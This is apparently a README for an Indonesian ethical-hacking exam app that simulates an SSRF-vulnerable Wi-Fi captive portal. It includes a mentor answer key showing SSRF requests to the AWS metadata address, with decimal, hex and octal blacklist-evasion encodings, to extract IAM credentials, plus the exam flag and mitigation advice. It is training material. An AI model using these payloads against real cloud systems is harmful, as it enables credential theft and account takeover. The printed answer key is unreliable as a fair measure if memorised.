# Modul 7: Cloud Security, SSRF & IAM Misconfiguration
**Program: Cybersecurity Ethical Hacker — PT Vinix Seven Aurum**  
**Skenario Ujian:** Portal Wi-Fi Tamu & Enterprise Cloud Storage  
**Entitas Simulasi:** PT Teknologi Aman Sejahtera  

---

## 1. Ringkasan Eksekutif & Karakteristik Aplikasi

Aplikasi ini didesain khusus sebagai media ujian praktikum berbasis simulasi realistis (*Black-box Assessment*) tanpa hint eksplisit di antarmuka web.

* **Tampilan Realistis (No Hints):** Bertindak sebagai portal Wi-Fi tamu (*Captive Portal*) korporat milik *PT Teknologi Aman Sejahtera*. Tidak ada kata kunci seperti *"SSRF"*, *"Vulnerable"*, *"Metadata"*, *"Lab"*, atau *"Hacking"* di seluruh teks antarmuka, header respons, maupun komentar kode HTML.
* **Isolasi Penuh (Mocked SSRF):** Dirancang agar aman dijalankan pada lingkungan cloud publik (*Replit*, VPS, atau PaaS) tanpa risiko *abuse*. Aplikasi tidak melakukan HTTP request socket keluar sungguhan, melainkan menggunakan mesin simulasi internal untuk menirukan perilaku **AWS Instance Metadata Service (IMDSv1)**.
* **Teknologi UI/UX:** Dibuat menggunakan **Bootstrap 5** dan **Bootstrap Icons** dengan tata letak modern, responsif, dan standar portal enterprise.

---

## 2. Struktur Direktori Proyek

```text
├── app.py                      # Konfigurasi Flask, routing, & logika simulasi Mock IMDSv1
├── requirements.txt            # Dependensi Python (Flask, gunicorn)
├── .replit                     # Konfigurasi eksekusi instan di Replit
├── test_app.py                 # Unit test otomatis untuk memvalidasi alur & kepatuhan rules
├── templates/
│   ├── index.html              # Antarmuka Captive Portal Tamu & Fitur Diagnostik
│   └── internal_storage.html   # Konsol Cloud Storage & Validasi IAM Role
└── README.md                   # Panduan Mentor, instruksi eksekusi, & writeup solusi
```

---

## 3. Panduan Menjalankan Aplikasi

### A. Menjalankan di Lingkungan Lokal (Windows / Linux / macOS)

1. **Pastikan Python 3.9+ terinstal:**
   ```bash
   python --version
   ```

2. **Buat virtual environment (opsional namun disarankan):**
   ```bash
   python -m venv venv
   # Di Windows:
   venv\Scripts\activate
   # Di Linux/macOS:
   source venv/bin/activate
   ```

3. **Instal dependensi:**
   ```bash
   pip install -r requirements.txt
   ```

4. **Jalankan aplikasi:**
   ```bash
   python app.py
   ```
   Aplikasi akan berjalan pada `http://127.0.0.1:5000` (atau port yang didefinisikan pada environment variable `PORT`).

5. **Menjalankan Unit Test Otomatis:**
   ```bash
   python test_app.py
   ```

### B. Menjalankan di Replit

1. Buka [Replit](https://replit.com), buat Repl baru dengan template **Python**.
2. Unggah seluruh file proyek ini (`app.py`, `requirements.txt`, `.replit`, dan folder `templates/`).
3. Klik tombol **Run**. File `.replit` akan otomatis mengeksekusi `python3 app.py` dan memetakan port web.

---

## 4. Panduan Mentor & Kunci Jawaban (Walkthrough Solusi)

Ujian ini melatih peserta mengidentifikasi rantai eksploitasi (*exploit chain*) dari celah web aplikasi sederhana menuju pengambilalihan akun cloud (*Cloud Account Takeover*).

### Tahap 1: Reconnaissance & Enumerasi
* Peserta membuka halaman utama (`/`).
* Peserta melakukan inspeksi elemen (*Inspect Element / View Source*) pada bagian *footer* halaman utama.
* Peserta menemukan tautan tersembunyi ke konsol internal:
  ```html
  <!-- Enterprise Infrastructure Services: Cloud Storage Gateway -> /internal-storage -->
  <a href="/internal-storage" class="d-none" id="internal-storage-link" ...>
  ```
* Saat mengakses `/internal-storage`, peserta menemukan form autentikasi IAM Cloud yang meminta 3 kredensial:
  1. `Access Key ID`
  2. `Secret Access Key`
  3. `Session Token`

### Tahap 2: Identifikasi Fitur Diagnostik Jaringan (SSRF Entry Point)
* Peserta beralih ke tab **"Uji Konektivitas Jaringan"** di halaman utama (`/` atau `/diagnostic`).
* Fitur ini menerima input URL untuk memeriksa keterjangkauan host.
* Jika peserta menguji `http://google.com`, server merespons:
  `Status 200 OK - Host Reachable`
* Jika peserta mencoba mengakses `localhost`, `127.0.0.1`, atau `file://`, server menolak dengan pesan:
  `Error: Invalid host`

### Tahap 3: Eksploitasi AWS Instance Metadata (IMDSv1) & IP Blacklist Evasion
Karena server dihosting pada cloud, peserta dapat menguji alamat IP metadata link-local AWS (`169.254.169.254`) atau menggunakan teknik **IP Blacklist Evasion** (desimal, heksadesimal, maupun oktal):

* **Format Standar:** `http://169.254.169.254`
* **Format Desimal (Dword):** `http://2852039166`
* **Format Heksadesimal:** `http://0xA9FEA9FE` atau `http://0xa9fea9fe`
* **Format Oktal:** `http://0251.0376.0251.0376`

1. **Memeriksa Endpoint Metadata:**
   * Input: `http://2852039166/latest/meta-data/` (atau format lainnya)
   * Respons:
     ```text
     iam/
     ```

2. **Memeriksa Security Credentials:**
   * Input: `http://0xA9FEA9FE/latest/meta-data/iam/security-credentials/`
   * Respons:
     ```text
     admin-role
     ```

3. **Mengekstrak Kredensial IAM Instance Profile:**
   * Input: `http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/admin-role`
   * Respons JSON:
     ```json
     {
       "Code": "Success",
       "Type": "AWS-HMAC",
       "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
       "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
       "Token": "IQoJb3JpZ2luX2VjE...",
       "Expiration": "2026-12-31T23:59:59Z"
     }
     ```

### Tahap 4: Cloud Takeover & Penyelesaian Ujian
* Peserta kembali ke `/internal-storage` dan memasukkan data kredensial:
  * **Access Key ID:** `AKIAIOSFODNN7EXAMPLE`
  * **Secret Access Key:** `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
  * **Session Token:** `IQoJb3JpZ2luX2VjE...`
* Berhasil login! Sistem menampilkan dokumen audit rahasia beserta flag kelulusan:

```text
FLAG{AWS_CL0UD_T4KEOV3R_SUCCESS}
```

---

## 5. Ringkasan Evaluasi & Rekomendasi DevSecOps (Untuk Bahan Diskusi Pasca-Ujian)

Setelah peserta menyelesaikan ujian, Mentor dapat memaparkan rekomendasi mitigasi nyata di industri:
1. **Migrasi ke IMDSv2:** Wajibkan penggunaan token berbasis sesi (`HttpTokens=required`, `HttpPutResponseHopLimit=1`) pada instance EC2 sehingga serangan SSRF standar (tanpa header khusus `X-aws-ec2-metadata-token`) otomatis digagalkan.
2. **Prinsip Least Privilege IAM:** Role EC2 tidak boleh diberi hak `AdministratorAccess` atau akses ke seluruh S3 bucket sensitif jika hanya melayani fungsi captive portal.
3. **Validasi Input & URL Whitelisting:** Terapkan allowlist ketat berbasis FQDN dan cegah skema atau alamat IP privat/link-local di level resolver DNS dan firewall aplikasi.

